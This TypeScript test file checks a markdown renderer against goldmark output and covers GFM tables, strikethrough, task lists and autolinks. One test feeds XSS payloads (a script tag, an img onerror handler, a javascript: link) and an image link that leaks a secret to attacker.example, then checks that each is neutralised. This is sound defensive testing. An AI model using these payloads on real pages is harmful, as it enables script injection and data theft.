import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { test } from 'node:test'
import { renderMarkdown } from './markdown.ts'

// testdata/markdown.json holds goldmark's output, configured as the Go
// server's render.go, for goldmark's GFM extension tests and Etherchat cases.
const golden = JSON.parse(readFileSync(new URL('testdata/markdown.json', import.meta.url), 'utf8')) as {
  cases: { name: string; md: string; html: string }[]
}

test('renders like goldmark', () => {
  const failures = golden.cases.filter((c) => renderMarkdown(c.md).value !== c.html)
  assert.deepEqual(failures.map((c) => c.name), [])
})

test('agent markdown is safe', () => {
  const out = renderMarkdown(`# Plan

<script>alert(1)</script>
<img src=x onerror=alert(2)>

[click](javascript:alert(3)) and [docs](https://example.com/docs) and [sibling](other.md)

![tracker](https://attacker.example/leak.png?d=secret)
`).value
  for (const bad of ['<script>', 'onerror', 'javascript:']) assert.ok(!out.includes(bad), bad)
  assert.ok(out.includes('<!-- raw HTML omitted -->'))
  assert.ok(out.includes('href="https://example.com/docs" rel="noopener noreferrer nofollow"'))
  assert.ok(out.includes('<span class="url">(https://example.com/docs)</span>'))
  assert.ok(out.includes('href="other.md">sibling</a>'))
  assert.ok(out.includes('<a href="">click</a>'))
})

test('GFM: tables, strikethrough, task lists, autolinks', () => {
  assert.equal(renderMarkdown('| a | b |\n|:-|-:|\n| 1 | 2 |').value,
    '<table>\n<thead>\n<tr>\n<th style="text-align:left">a</th>\n<th style="text-align:right">b</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="text-align:left">1</td>\n<td style="text-align:right">2</td>\n</tr>\n</tbody>\n</table>\n')
  assert.equal(renderMarkdown('~a~ and ~~b~~').value, '<p><del>a</del> and <del>b</del></p>\n')
  assert.equal(renderMarkdown('- [ ] todo\n- [x] done').value,
    '<ul>\n<li><input disabled="" type="checkbox"> todo</li>\n<li><input checked="" disabled="" type="checkbox"> done</li>\n</ul>\n')
  assert.equal(renderMarkdown('see www.example.com/a. or bob@example.com').value,
    '<p>see <a href="http://www.example.com/a" rel="noopener noreferrer nofollow">www.example.com/a</a>. or <a href="mailto:bob@example.com" rel="noopener noreferrer nofollow">bob@example.com</a></p>\n')
})
